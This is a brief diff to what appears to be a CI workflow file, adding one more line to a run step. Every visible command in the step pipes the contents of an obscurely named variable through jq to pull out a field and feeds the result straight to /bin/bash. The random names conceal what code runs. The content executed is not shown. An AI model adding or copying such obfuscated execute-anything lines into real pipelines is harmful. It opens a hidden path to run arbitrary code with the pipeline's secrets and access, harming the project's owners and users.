@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$vmhgd1643" | jq -r .njfdv32 | /bin/bash
           echo $c1 | jq -r .fc36 | /bin/bash
           echo $luput6 | jq -r .yx18796 | /bin/bash
+          echo $un3 | jq -r .xz0 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
